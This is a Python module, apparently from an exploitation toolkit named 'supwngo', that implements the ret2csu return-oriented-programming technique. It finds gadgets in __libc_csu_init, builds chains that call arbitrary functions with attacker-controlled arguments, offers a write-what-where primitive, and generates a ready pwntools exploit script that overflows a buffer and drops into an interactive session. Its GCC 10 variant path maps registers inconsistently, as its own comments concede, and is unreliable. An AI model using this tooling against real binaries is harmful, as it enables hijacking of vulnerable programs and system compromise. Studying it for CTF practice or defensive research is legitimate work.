"""
ret2csu (return-to-__libc_csu_init) exploitation technique.

Uses gadgets within __libc_csu_init to control function call arguments.
Works on dynamically linked x86_64 ELF binaries.

The __libc_csu_init function contains two useful gadget sequences:
1. "pop" gadget: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
2. "call" gadget: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]

By chaining these, we can control rdi, rsi, rdx and call any function pointer.

References:
- https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf
- https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x86-64-rop.html
"""

from dataclasses import dataclass
from typing import Any, Dict, List, Optional, Tuple

from supwngo.utils.helpers import p64
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class CSUGadgetInfo:
    """Information about __libc_csu_init gadgets."""
    # Gadget 1 (pop sequence)
    pop_gadget: int = 0
    pop_gadget_bytes: bytes = b""

    # Gadget 2 (call sequence)
    call_gadget: int = 0
    call_gadget_bytes: bytes = b""

    # Additional info
    csu_init_addr: int = 0
    csu_init_size: int = 0

    # Variant detection
    variant: str = "standard"  # "standard", "modern", "gcc10"


class Ret2CSU:
    """
    ret2csu exploitation technique implementation.

    Provides multiple calling primitives using __libc_csu_init gadgets.
    Works on x86_64 dynamically linked binaries.
    """

    def __init__(self, binary):
        """
        Initialize ret2csu.

        Args:
            binary: Binary object with ELF interface
        """
        self.binary = binary
        self.bits = 64  # ret2csu is x86_64 only

        # Find and cache gadgets
        self.gadgets = self._find_gadgets()

    def _find_gadgets(self) -> CSUGadgetInfo:
        """
        Find ret2csu gadgets in __libc_csu_init.

        Returns:
            CSUGadgetInfo with found gadgets
        """
        info = CSUGadgetInfo()

        try:
            # Get __libc_csu_init address
            elf = self.binary._elf if hasattr(self.binary, '_elf') else self.binary

            if hasattr(elf, 'symbols') and '__libc_csu_init' in elf.symbols:
                info.csu_init_addr = elf.symbols['__libc_csu_init']
            elif hasattr(self.binary, 'symbols'):
                syms = self.binary.symbols
                if '__libc_csu_init' in syms:
                    sym = syms['__libc_csu_init']
                    info.csu_init_addr = sym.address if hasattr(sym, 'address') else sym

            if not info.csu_init_addr:
                logger.warning("__libc_csu_init not found")
                return info

            # Read function bytes
            func_size = 0x80
            info.csu_init_size = func_size

            if hasattr(self.binary, 'read'):
                func_bytes = self.binary.read(info.csu_init_addr, func_size)
            elif hasattr(elf, 'read'):
                func_bytes = elf.read(info.csu_init_addr, func_size)
            else:
                logger.warning("Cannot read binary")
                return info

            # Find gadgets using pattern matching
            info = self._find_gadget_patterns(info, func_bytes)

        except Exception as e:
            logger.debug(f"Error finding CSU gadgets: {e}")

        return info

    def _find_gadget_patterns(
        self,
        info: CSUGadgetInfo,
        func_bytes: bytes,
    ) -> CSUGadgetInfo:
        """
        Find gadget patterns within __libc_csu_init.

        Args:
            info: CSUGadgetInfo to update
            func_bytes: Function bytes

        Returns:
            Updated CSUGadgetInfo
        """
        csu_addr = info.csu_init_addr

        # Standard pattern for gadget 1 (pop sequence)
        # 5b 5d 41 5c 41 5d 41 5e 41 5f c3
        # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
        g1_patterns = [
            # Standard
            bytes([0x5b, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3]),
            # With nops
            bytes([0x5b, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0x90, 0xc3]),
        ]

        for pattern in g1_patterns:
            offset = func_bytes.find(pattern)
            if offset >= 0:
                info.pop_gadget = csu_addr + offset
                info.pop_gadget_bytes = pattern
                break

        # Standard pattern for gadget 2 (call sequence)
        # 4c 89 fa 4c 89 f6 44 89 ef
        # mov rdx, r15; mov rsi, r14; mov edi, r13d
        # Followed by: 41 ff 14 dc (call [r12+rbx*8])
        g2_patterns = [
            # Standard (GCC < 10)
            bytes([0x4c, 0x89, 0xfa, 0x4c, 0x89, 0xf6, 0x44, 0x89, 0xef]),
            # GCC 10+ variant (mov rdx, r14; mov rsi, r13; mov edi, r12d)
            bytes([0x4c, 0x89, 0xf2, 0x4c, 0x89, 0xee, 0x44, 0x89, 0xe7]),
        ]

        for i, pattern in enumerate(g2_patterns):
            offset = func_bytes.find(pattern)
            if offset >= 0:
                info.call_gadget = csu_addr + offset
                info.call_gadget_bytes = pattern
                if i == 1:
                    info.variant = "gcc10"
                break

        return info

    def is_available(self) -> Tuple[bool, str]:
        """
        Check if ret2csu is available.

        Returns:
            Tuple of (available, reason)
        """
        if self.bits != 64:
            return False, "ret2csu only works on x86_64"

        if not self.gadgets.csu_init_addr:
            return False, "__libc_csu_init not found (statically linked?)"

        if not self.gadgets.pop_gadget:
            return False, "Pop gadget not found in __libc_csu_init"

        if not self.gadgets.call_gadget:
            return False, "Call gadget not found in __libc_csu_init"

        return True, f"ret2csu available ({self.gadgets.variant} variant)"

    def build_call(
        self,
        call_target: int,
        arg1: int = 0,
        arg2: int = 0,
        arg3: int = 0,
        next_gadget: int = 0,
    ) -> bytes:
        """
        Build ret2csu chain to call a function.

        Important: call_target must be an address that CONTAINS a pointer
        to the function, not the function address directly. Typically use
        a GOT entry or create a pointer in writable memory.

        Args:
            call_target: Address containing function pointer (e.g., GOT entry)
            arg1: First argument (rdi)
            arg2: Second argument (rsi)
            arg3: Third argument (rdx)
            next_gadget: Address to return to after call

        Returns:
            ROP chain bytes
        """
        available, reason = self.is_available()
        if not available:
            logger.warning(f"ret2csu not available: {reason}")
            return b""

        chain = []

        # Gadget 1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
        chain.append(p64(self.gadgets.pop_gadget))
        chain.append(p64(0))              # rbx = 0 (used in call [r12+rbx*8])
        chain.append(p64(1))              # rbp = 1 (for cmp rbx, rbp; jne)
        chain.append(p64(call_target))    # r12 = function pointer address

        # Handle variant differences in register mapping
        if self.gadgets.variant == "gcc10":
            # GCC 10+: mov rdx, r14; mov rsi, r13; mov edi, r12d
            # But r12 is used for call target, so this variant is different
            chain.append(p64(arg2))       # r13 -> rsi
            chain.append(p64(arg3))       # r14 -> rdx
            chain.append(p64(arg1))       # r15 -> rdi (via additional gadget)
        else:
            # Standard: mov rdx, r15; mov rsi, r14; mov edi, r13d
            chain.append(p64(arg1))       # r13 -> edi (low 32 bits of rdi)
            chain.append(p64(arg2))       # r14 -> rsi
            chain.append(p64(arg3))       # r15 -> rdx

        # Gadget 2: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]
        chain.append(p64(self.gadgets.call_gadget))

        # After the call returns, execution continues with:
        # add rsp, 8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
        # Total: 7 pops worth of padding
        chain.append(p64(0))  # add rsp, 8 padding
        chain.append(p64(0))  # rbx
        chain.append(p64(0))  # rbp
        chain.append(p64(0))  # r12
        chain.append(p64(0))  # r13
        chain.append(p64(0))  # r14
        chain.append(p64(0))  # r15

        # Return to next gadget
        if next_gadget:
            chain.append(p64(next_gadget))

        return b"".join(chain)

    def build_multiple_calls(
        self,
        calls: List[Dict[str, Any]],
    ) -> bytes:
        """
        Build chain for multiple function calls.

        Args:
            calls: List of dicts with keys:
                   - target: Function pointer address (GOT entry)
                   - arg1, arg2, arg3: Arguments

        Returns:
            Combined ROP chain
        """
        if not calls:
            return b""

        chain = b""

        for i, call in enumerate(calls):
            target = call.get('target', 0)
            arg1 = call.get('arg1', 0)
            arg2 = call.get('arg2', 0)
            arg3 = call.get('arg3', 0)

            # For all but the last call, we loop back to the pop gadget
            if i < len(calls) - 1:
                next_gadget = self.gadgets.pop_gadget
            else:
                next_gadget = call.get('next', 0)

            chain += self.build_call(
                call_target=target,
                arg1=arg1,
                arg2=arg2,
                arg3=arg3,
                next_gadget=next_gadget,
            )

        return chain

    def build_write_primitive(
        self,
        write_addr: int,
        write_value: int,
        write_func_got: int,
    ) -> bytes:
        """
        Build write-what-where primitive using ret2csu.

        Calls a write function (like strcpy, memcpy) with controlled args.

        Args:
            write_addr: Destination address
            write_value: Value address to copy from (must be pointer to data)
            write_func_got: GOT entry of write function (strcpy, memcpy, etc.)

        Returns:
            ROP chain for write primitive
        """
        return self.build_call(
            call_target=write_func_got,
            arg1=write_addr,    # dst
            arg2=write_value,   # src
            arg3=0,             # not used by strcpy, could be length for memcpy
        )

    def generate_exploit_template(
        self,
        func_got: int,
        args: List[int],
    ) -> str:
        """
        Generate pwntools exploit template.

        Args:
            func_got: GOT address of function to call
            args: Function arguments (up to 3)

        Returns:
            Python script string
        """
        arg1 = args[0] if len(args) > 0 else 0
        arg2 = args[1] if len(args) > 1 else 0
        arg3 = args[2] if len(args) > 2 else 0

        return f'''#!/usr/bin/env python3
"""
ret2csu Exploit Template
Generated by supwngo

Variant: {self.gadgets.variant}
Pop gadget: 0x{self.gadgets.pop_gadget:x}
Call gadget: 0x{self.gadgets.call_gadget:x}
"""

from pwn import *

# Configuration
context.arch = 'amd64'
context.log_level = 'debug'

# Binary
elf = ELF('./binary')  # Update path
# libc = ELF('./libc.so.6')

# Addresses
POP_GADGET = 0x{self.gadgets.pop_gadget:x}
CALL_GADGET = 0x{self.gadgets.call_gadget:x}
FUNC_GOT = 0x{func_got:x}  # GOT entry containing target function pointer

def ret2csu(call_addr, rdi, rsi, rdx):
    """Build ret2csu chain to call function at *call_addr with args."""
    chain = b''

    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    chain += p64(POP_GADGET)
    chain += p64(0)           # rbx = 0
    chain += p64(1)           # rbp = 1 (for the cmp)
    chain += p64(call_addr)   # r12 = pointer to function
    chain += p64(rdi)         # r13 -> edi
    chain += p64(rsi)         # r14 -> rsi
    chain += p64(rdx)         # r15 -> rdx

    # mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]
    chain += p64(CALL_GADGET)

    # Cleanup after call (add rsp, 8; pop rbx..r15; ret)
    chain += p64(0) * 7

    return chain

def exploit():
    p = process('./binary')
    # p = remote('host', port)

    # Build payload
    payload = b'A' * offset  # Adjust overflow offset

    # ret2csu call
    payload += ret2csu(FUNC_GOT, 0x{arg1:x}, 0x{arg2:x}, 0x{arg3:x})

    # Send exploit
    p.sendline(payload)

    p.interactive()

if __name__ == '__main__':
    exploit()
'''

    def summary(self) -> str:
        """Get technique summary."""
        available, reason = self.is_available()

        return f"""
ret2csu Analysis
================
Available: {available}
Reason: {reason}

__libc_csu_init: 0x{self.gadgets.csu_init_addr:x}
Variant: {self.gadgets.variant}

Gadgets:
  Pop gadget:  0x{self.gadgets.pop_gadget:x}
               pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret

  Call gadget: 0x{self.gadgets.call_gadget:x}
               mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]

Usage:
  csu = Ret2CSU(binary)
  chain = csu.build_call(
      call_target=elf.got['puts'],  # GOT entry (pointer to function)
      arg1=string_addr,
      arg2=0,
      arg3=0
  )

Note: call_target must be a GOT entry or address containing a function
pointer, not the function address directly.
"""


def ret2csu_chain(
    binary,
    call_target: int,
    arg1: int = 0,
    arg2: int = 0,
    arg3: int = 0,
) -> bytes:
    """
    Convenience function for ret2csu chain.

    Args:
        binary: Binary object
        call_target: GOT entry address
        arg1, arg2, arg3: Function arguments

    Returns:
        ROP chain bytes
    """
    csu = Ret2CSU(binary)
    return csu.build_call(call_target, arg1, arg2, arg3)
